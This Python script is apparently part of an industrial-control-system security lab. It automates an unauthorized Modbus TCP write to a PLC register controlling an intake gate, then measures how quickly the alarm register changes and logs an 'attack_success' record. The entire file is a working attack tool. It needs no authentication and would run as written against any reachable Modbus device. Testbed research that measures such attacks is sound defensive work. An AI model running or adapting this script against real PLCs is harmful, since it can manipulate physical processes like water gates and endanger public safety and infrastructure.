"""
Experiment 01 — Unauthorized Modbus Control of the Intake Gate.

Automates and MEASURES the manual attack sequence already demonstrated
step-by-step in attacker/tools/ (recon -> probe -> exploit), producing
a timestamped, reproducible result record instead of a one-off manual
demo. This is the formal "measure it properly" step that comes AFTER
that manual exploration — see README.md in this folder for the full
experiment writeup (objective, hypothesis, method, results).

Usage:
    python3 run_experiment.py <plc_host> [plc_port] [register] [raw_value]

Example (register/value discovered via the manual workflow):
    python3 run_experiment.py plc 5020 6 1000
"""

import csv
import json
import sys
import time
from pathlib import Path

from pymodbus.client import ModbusTcpClient

RESULTS_DIR = Path(__file__).resolve().parents[2] / "data" / "experiments" / "01-modbus-control"
POLL_INTERVAL_S = 0.5
MAX_WAIT_S = 20

# Which raw register index carries the alarm code, for this
# experiment's own measurement purposes — known from the manual
# recon/probe workflow, not imported from project source.
ALARM_REGISTER_INDEX = 5
REGISTER_COUNT = 7


def read_all(client: ModbusTcpClient) -> list:
    result = client.read_holding_registers(address=0, count=REGISTER_COUNT, slave=1)
    if result.isError():
        raise RuntimeError(f"Read failed: {result}")
    return result.registers


def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: python3 run_experiment.py <plc_host> [plc_port] [register] [raw_value]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5020
    register = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    raw_value = int(sys.argv[4]) if len(sys.argv) > 4 else 1000

    client = ModbusTcpClient(host, port=port)
    if not client.connect():
        print(f"Could not connect to {host}:{port}")
        sys.exit(1)

    print("[experiment] Recording baseline state...")
    baseline = read_all(client)
    baseline_alarm = baseline[ALARM_REGISTER_INDEX]
    print(f"[experiment] Baseline registers: {baseline}")

    print(f"[experiment] Writing unauthorized command: register {register} = {raw_value}")
    write_time = time.time()
    write_result = client.write_register(address=register, value=raw_value, slave=1)
    write_accepted = not write_result.isError()
    print(f"[experiment] Write accepted: {write_accepted}")

    print("[experiment] Polling for physical impact (alarm state change)...")
    detected_change_at = None
    final_registers = baseline
    elapsed = 0.0
    while elapsed < MAX_WAIT_S:
        time.sleep(POLL_INTERVAL_S)
        elapsed = time.time() - write_time
        current = read_all(client)
        if current[ALARM_REGISTER_INDEX] != baseline_alarm:
            detected_change_at = elapsed
            final_registers = current
            break
        final_registers = current

    client.close()

    time_to_physical_effect_s = round(detected_change_at, 2) if detected_change_at else None
    attack_success = write_accepted and (final_registers != baseline)

    result = {
        "experiment_id": "01-modbus-control",
        "timestamp": write_time,
        "target_host": host,
        "target_port": port,
        "register_written": register,
        "raw_value_written": raw_value,
        "write_accepted": write_accepted,
        "baseline_registers": baseline,
        "final_registers": final_registers,
        "baseline_alarm_code": baseline_alarm,
        "final_alarm_code": final_registers[ALARM_REGISTER_INDEX],
        "alarm_state_changed": final_registers[ALARM_REGISTER_INDEX] != baseline_alarm,
        "time_to_alarm_change_s": time_to_physical_effect_s,
        "attack_success": attack_success,
    }

    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    json_path = RESULTS_DIR / f"result_{int(write_time)}.json"
    with open(json_path, "w") as f:
        json.dump(result, f, indent=2)

    csv_path = RESULTS_DIR / "results.csv"
    write_header = not csv_path.exists()
    with open(csv_path, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(result.keys()))
        if write_header:
            writer.writeheader()
        writer.writerow(result)

    print("\n[experiment] ===== RESULT =====")
    for k, v in result.items():
        print(f"  {k}: {v}")
    print(f"\n[experiment] Saved: {json_path}")
    print(f"[experiment] Appended: {csv_path}")


if __name__ == "__main__":
    main()